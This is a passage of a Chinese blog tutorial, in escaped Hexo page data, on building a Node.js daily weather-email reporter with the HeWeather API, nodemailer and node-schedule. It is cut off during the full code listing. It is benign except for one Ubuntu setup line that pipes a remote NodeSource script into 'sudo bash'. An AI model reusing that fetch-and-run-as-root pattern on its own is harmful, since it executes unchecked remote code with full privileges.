href=\"https://github.com/miyunluo/Funny_Tools/tree/master/Weather_Email_Reporter\" target=\"_blank\" rel=\"noopener\">github</a></p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“想不想每天给她/他发送一条天气提醒呢”</p>\n</blockquote>\n<h2 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h2><ol>\n<li>魔都的天气，太魔性了…尤其是梅雨季</li>\n<li>ios自带天气app无提醒，经常忘记查看。使用过 Mr.Weather、Colorful Pro，提醒又过多，导致通知栏里全是天气通知</li>\n<li>需求其实很简单，一份简介明了又不扰人的天气提醒</li>\n<li>使用邮件无需额外费用，比短信提醒易于实现，使用node.js更是十分简单</li>\n</ol>\n<hr>\n<h2 id=\"Setup\"><a href=\"#Setup\" class=\"headerlink\" title=\"Setup\"></a>Setup</h2><p>使用node.js实现天气获取与邮件发送，首先需要安装node。</p>\n<ul>\n<li><p>macOS 推荐使用 homebrew 进行安装，也可下载Installer安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span>$ brew install node</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Ubuntu</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span>$ curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class=\"line\"><span class=\"meta\">&gt;</span>$ sudo apt-get install -y nodejs</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Windows</p>\n<p>直接下载Installer <a href=\"https://nodejs.org/en/download\" target=\"_blank\" rel=\"noopener\">https://nodejs.org/en/download</a></p>\n</li>\n</ul>\n<h2 id=\"注册Heweather\"><a href=\"#注册Heweather\" class=\"headerlink\" title=\"注册Heweather\"></a>注册Heweather</h2><p>获取天气信息需要依赖提供天气查询服务的网站。在对比了和风天气与丫丫天气后，发现同为免费用户的情况下，和风天气提供的信息更为全面，这里使用和风。(至今没收到丫丫的验证邮件…)</p>\n<ul>\n<li><p>用户注册</p>\n<p>地址：<a href=\"http://www.heweather.com\" target=\"_blank\" rel=\"noopener\">http://www.heweather.com</a></p>\n</li>\n<li><p>获得想要查询城市或区域的编码：</p>\n<p>地址：<a href=\"https://www.heweather.com/documents/city\" target=\"_blank\" rel=\"noopener\">https://www.heweather.com/documents/city</a></p>\n<p>如 松江区：CN101020900，闵行区：CN101020200。</p>\n</li>\n<li><p>获得认证key</p>\n<p>注册后登录，地址：控制台-&gt;我的控制台-&gt;认证key</p>\n</li>\n<li><p>免费查询api</p>\n<p>根据和风天气文档，获取天气信息大合集的url如下，返回一份json数据，具体字段信息请参考官方文档</p>\n<p><a href=\"https://free-api.heweather.com/s6/weather?location=CITY_CODE&amp;key=YOUR_KEY\" target=\"_blank\" rel=\"noopener\">https://free-api.heweather.com/s6/weather?location=CITY_CODE&amp;key=YOUR_KEY</a></p>\n<p>将 <strong>CITY_CODE</strong> 替换为第二步得到的城市代码，如CN101020900</p>\n<p>将 <strong>YOUR_KEY</strong> 替换为第三步自己的key</p>\n</li>\n</ul>\n<h2 id=\"开启SMTP\"><a href=\"#开启SMTP\" class=\"headerlink\" title=\"开启SMTP\"></a>开启SMTP</h2><p>使用smtp协议进行邮件发送，需要开启邮箱的smtp服务，一般在邮箱的设置中。</p>\n<p>以163邮箱为例，smtp在 设置-&gt;POP3/SMTP/IMAP 选项下。</p>\n<p><img src=\"/images/in-post/post-blog-POP3SMTPIMAP.png\" alt=\"img\"></p>\n<p>初次开启，会要求设置授权码，此授权码就是之后使用smtp协议发邮件时的密码，注意与邮箱登录密码区别。</p>\n<p><img src=\"/images/in-post/post-blog-AuthCode.png\" alt=\"img\"></p>\n<p>QQ邮箱开启方法类似。</p>\n<hr>\n<h2 id=\"问题分解\"><a href=\"#问题分解\" class=\"headerlink\" title=\"问题分解\"></a>问题分解</h2><ol>\n<li><strong>请求并处理天气数据</strong></li>\n</ol>\n<p>首先当然是要获得需要的天气数据，由于要进行网络请求，这里使用 <code>request</code> 模块。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> request=<span class=\"built_in\">require</span>(<span class=\"string\">'request'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> url= <span class=\"string\">'https://free-api.heweather.com/s6/weather?location=***********&amp;key=********************************'</span>;</span><br><span class=\"line\">request(url,(error,response,body)=&gt;&#123;&#125;;</span><br></pre></td></tr></table></figure>\n<p>返回参数 <code>body</code> 包含我们需要的天气信息，部分信息格式化后的内容如下。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">\"HeWeather6\"</span>: [</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"attr\">\"basic\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"cid\"</span>: <span class=\"string\">\"CN101020900\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"location\"</span>: <span class=\"string\">\"松江\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"parent_city\"</span>: <span class=\"string\">\"上海\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"admin_area\"</span>: <span class=\"string\">\"上海\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"cnty\"</span>: <span class=\"string\">\"中国\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"lat\"</span>: <span class=\"string\">\"31.03046989\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"lon\"</span>: <span class=\"string\">\"121.22354126\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"tz\"</span>: <span class=\"string\">\"+8.00\"</span></span><br><span class=\"line\">            &#125;, </span><br><span class=\"line\">            <span class=\"attr\">\"status\"</span>: <span class=\"string\">\"ok\"</span>, </span><br><span class=\"line\">            <span class=\"attr\">\"now\"</span>: &#123;</span><br><span class=\"line\">                <span class=\"attr\">\"cloud\"</span>: <span class=\"string\">\"0\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"cond_code\"</span>: <span class=\"string\">\"101\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"cond_txt\"</span>: <span class=\"string\">\"多云\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"fl\"</span>: <span class=\"string\">\"38\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"hum\"</span>: <span class=\"string\">\"56\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"pcpn\"</span>: <span class=\"string\">\"0.0\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"pres\"</span>: <span class=\"string\">\"1003\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"tmp\"</span>: <span class=\"string\">\"34\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"vis\"</span>: <span class=\"string\">\"10\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_deg\"</span>: <span class=\"string\">\"123\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_dir\"</span>: <span class=\"string\">\"东南风\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_sc\"</span>: <span class=\"string\">\"2\"</span>, </span><br><span class=\"line\">                <span class=\"attr\">\"wind_spd\"</span>: <span class=\"string\">\"6\"</span></span><br><span class=\"line\">            &#125;, </span><br><span class=\"line\">            <span class=\"attr\">\"daily_forecast\"</span>: [</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    <span class=\"attr\">\"cond_code_d\"</span>: <span class=\"string\">\"100\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"cond_code_n\"</span>: <span class=\"string\">\"101\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"cond_txt_d\"</span>: <span class=\"string\">\"晴\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"cond_txt_n\"</span>: <span class=\"string\">\"多云\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"date\"</span>: <span class=\"string\">\"2018-05-16\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"hum\"</span>: <span class=\"string\">\"74\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"mr\"</span>: <span class=\"string\">\"05:40\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"ms\"</span>: <span class=\"string\">\"19:34\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"pcpn\"</span>: <span class=\"string\">\"0.0\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"pop\"</span>: <span class=\"string\">\"0\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"pres\"</span>: <span class=\"string\">\"1005\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"sr\"</span>: <span class=\"string\">\"04:59\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"ss\"</span>: <span class=\"string\">\"18:44\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"tmp_max\"</span>: <span class=\"string\">\"36\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"tmp_min\"</span>: <span class=\"string\">\"25\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"uv_index\"</span>: <span class=\"string\">\"10\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"vis\"</span>: <span class=\"string\">\"13\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_deg\"</span>: <span class=\"string\">\"181\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_dir\"</span>: <span class=\"string\">\"南风\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_sc\"</span>: <span class=\"string\">\"4-5\"</span>, </span><br><span class=\"line\">                    <span class=\"attr\">\"wind_spd\"</span>: <span class=\"string\">\"25\"</span></span><br><span class=\"line\">                &#125;, </span><br><span class=\"line\">                </span><br><span class=\"line\">            ], </span><br><span class=\"line\">            ......</span><br></pre></td></tr></table></figure>\n<p>当然根据和风天气的文档，已知这是一个json文件，直接使用json parser对 <code>body</code> 处理即可。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data=<span class=\"built_in\">JSON</span>.parse(body);</span><br><span class=\"line\">data=data.HeWeather6[<span class=\"number\">0</span>];</span><br></pre></td></tr></table></figure>\n<p>json中包含的信息比较多，可以筛选一些重要的信息来使用。比如 日出时间: <code>daliy_forecast.sr</code>，日落时间: <code>daliy_forecast.ss</code>，最高温度: <code>daliy_forecast.tmp_max</code>，最低温度: <code>daliy_forecast.tmp_min</code>，降水概率: <code>daliy_forecast.pop</code> 等。</p>\n<ol start=\"2\">\n<li><strong>邮件编排</strong></li>\n</ol>\n<p>获得了天气数据后，就可以发送邮件了，但是如何编辑排列得到的天气数据也是一个需要考虑的问题，发一堆杂乱无章的数据，视觉观感不好。当然邮件本身支持html样式，可以编写一个简单的html样式来排列邮件内容。</p>\n<p>最终进行邮件发送时，只需要将这一样式表拼接为字符串即可。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>给主席的天气预报<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">style</span>=<span class=\"string\">\"margin:20px auto 10px auto\"</span>&gt;</span> data.daily_forecast[0].date   data.basic.location 区<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>日出时间: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].sr <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:40%;margin-left: 30px\"</span>&gt;</span>日落时间: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].ss+ <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>白天: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].cond_txt_d <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:40%;margin-left: 30px\"</span>&gt;</span>晚间: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].cond_txt_n <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>最高温度: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>data.daily_forecast[0].tmp_max<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span>℃<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"width:40%;margin-left: 30px\"</span>&gt;</span>最低温度: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>data.daily_forecast[0].tmp_min<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span>℃<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>紫外线强度指数: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">b</span>&gt;</span>data.daily_forecast[0].uv_index<span class=\"tag\">&lt;/<span class=\"name\">b</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>降水概率: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>data.daily_forecast[0].pop %<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>风力: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.daily_forecast[0].wind_sc <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>穿衣建议: <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span> data.lifestyle[1].txt <span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">     \t<span class=\"tag\">&lt;<span class=\"name\">small</span>&gt;</span>注 紫外线强度: 0-2 无危险 | 3-5 较轻伤害 | 6-7 很大伤害 | 8-10 极高伤害 | 11+ 及其危险<span class=\"tag\">&lt;/<span class=\"name\">small</span>&gt;</span></span><br><span class=\"line\">     <span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li><strong>邮件发送</strong></li>\n</ol>\n<p>发送邮件使用 <code>nodemailer</code> 模块。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> nodemailer=<span class=\"built_in\">require</span>(<span class=\"string\">'nodemailer'</span>);</span><br><span class=\"line\"><span class=\"comment\">// 建立SMTP连接</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> smtpTransport = nodemailer.createTransport(&#123;</span><br><span class=\"line\">  host: <span class=\"string\">\"smtp.163.com\"</span>, <span class=\"comment\">// smtp主机</span></span><br><span class=\"line\">  secureConnection: <span class=\"literal\">true</span>, <span class=\"comment\">// 使用SSL</span></span><br><span class=\"line\">  port: <span class=\"number\">465</span>, <span class=\"comment\">// SMTP 端口</span></span><br><span class=\"line\">  auth: &#123;</span><br><span class=\"line\">    user: <span class=\"string\">\"邮箱前缀@163.com\"</span>, <span class=\"comment\">// 账号</span></span><br><span class=\"line\">    pass: <span class=\"string\">\"******\"</span> <span class=\"comment\">// 授权码</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">// 设置邮件内容</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> mailOptions = &#123;</span><br><span class=\"line\">  <span class=\"keyword\">from</span>: <span class=\"string\">\"名字 &lt;邮箱前缀@163.com&gt;\"</span>, <span class=\"comment\">// 发件地址</span></span><br><span class=\"line\">  to: <span class=\"string\">\"XXXXXXX@example.com\"</span>, <span class=\"comment\">// 收件地址</span></span><br><span class=\"line\">  subject: <span class=\"string\">\"Hello\"</span>, <span class=\"comment\">// 标题</span></span><br><span class=\"line\">  html: <span class=\"string\">\"&lt;b&gt;邮件由nodemailer发送&lt;/b&gt;\"</span> <span class=\"comment\">// html实例，替换为第2步的天气内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\">// 发送邮件</span></span><br><span class=\"line\">smtpTransport.sendMail(mailOptions, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">error, response</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(error)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"Message sent: \"</span> + response.message);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  smtpTransport.close(); <span class=\"comment\">// 关闭连接</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li><strong>定时</strong></li>\n</ol>\n<p>Unix 与 Linux本身提供了定时启动指令 <code>crontab</code>，当然 node.js 也有自己的定时器，而且使用起来更加方便。</p>\n<p>使用模块 <code>node-schedule</code>。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> schedule=<span class=\"built_in\">require</span>(<span class=\"string\">'node-schedule'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> rule = <span class=\"keyword\">new</span> schedule.RecurrenceRule();</span><br><span class=\"line\">rule.hour = <span class=\"number\">6</span>; rule.minute = <span class=\"number\">30</span>; rule.second = <span class=\"number\">0</span>; <span class=\"comment\">// 定时 06:30:00</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> run = schedule.scheduleJob(rule, YOUR_FUNC); <span class=\"comment\">// YOUR_FUNC 为想要执行的函数</span></span><br></pre></td></tr></table></figure>\n<p>至此所有模块已经基本完成，之后将天气查询，与邮件发送功能封装在一个函数中，传入 <code>schudle.scheduleJob</code> 即可。</p>\n<h2 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> request = <span class=\"built_in\">require</span>(<span class=\"string\">'request'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> nodemailer = <span class=\"built_in\">require</span>(<span class=\"string\">'nodemailer'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> schedule = <span class=\"built_in\">require</span>(<span class=\"string\">'node-schedule'</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> rule = <span class=\"keyword\">new</span> schedule.RecurrenceRule();</span><br><span class=\"line\">rule.hour = <span class=\"number\">6</span>; rule.minute = <span class=\"number\">30</span>; rule.second = <span class=\"number\">0</span>; <span class=\"comment\">// 设置定时发送的时间</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> data= <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> j = schedule.scheduleJob(rule, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'发送天气预报...'</span>);</span><br><span class=\"line\">  \tsendWeather();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sendWeather</span>(<span 